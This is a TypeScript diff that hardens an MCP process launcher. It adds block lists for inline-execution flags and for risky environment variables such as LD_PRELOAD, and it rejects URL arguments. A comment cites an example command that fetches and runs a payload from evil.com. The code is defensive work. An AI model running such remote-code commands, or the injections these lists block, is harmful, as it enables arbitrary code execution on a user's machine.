@@ -16,6 +16,46 @@ type McpStatus = 'running' | 'stopped' | 'error'
 
 const ALLOWED_MCP_COMMANDS = new Set(['npx', 'node', 'python', 'python3', 'deno', 'uvx', 'bunx', 'bun', 'uv'])
 
+// Flags that allow inline code execution per runtime
+const BLOCKED_ARG_PATTERNS: Record<string, RegExp[]> = {
+  node:    [/^-[erpc]$/, /^--eval$/, /^--require$/, /^--print$/, /^--input-type$/],
+  python:  [/^-[cm]$/],
+  python3: [/^-[cm]$/],
+  deno:    [],
+  uvx:     [],
+  bunx:    [],
+  bun:     [/^-e$/, /^--eval$/],
+  npx:     [],
+  uv:      [],
+}
+
+const BLOCKED_ENV_KEYS = new Set([
+  'PATH', 'NODE_PATH', 'PYTHONPATH', 'HOME', 'USERPROFILE', 'LD_PRELOAD', 'LD_LIBRARY_PATH',
+])
+
+function validateMcpArgs(command: string, args: string[]): void {
+  const blockedPatterns = BLOCKED_ARG_PATTERNS[command] ?? []
+  for (const arg of args) {
+    for (const pattern of blockedPatterns) {
+      if (pattern.test(arg)) {
+        throw new Error(`Argument '${arg}' is not permitted for command '${command}'`)
+      }
+    }
+    // Block URLs in args (prevents deno run https://evil.com/payload.ts)
+    if (/^https?:\/\//i.test(arg)) {
+      throw new Error(`URL arguments are not permitted: ${arg}`)
+    }
+  }
+}
+
+function validateMcpEnv(env: Record<string, string> | undefined): void {
+  for (const key of Object.keys(env ?? {})) {
+    if (BLOCKED_ENV_KEYS.has(key)) {
+      throw new Error(`Environment variable '${key}' cannot be overridden`)
+    }
+  }
+}
+
 export class McpProcessManager {
   private processes = new Map<string, ChildProcess>()
   private statuses  = new Map<string, McpStatus>()
@@ -70,6 +110,8 @@ export class McpProcessManager {
     if (!ALLOWED_MCP_COMMANDS.has(config.command)) {
       throw new Error(`MCP command not allowed: ${config.command}`)
     }
+    validateMcpArgs(config.command, config.args)
+    validateMcpEnv(config.env)
 
     const proc = spawn(config.command, config.args, {
       env: { ...process.env, ...config.env },
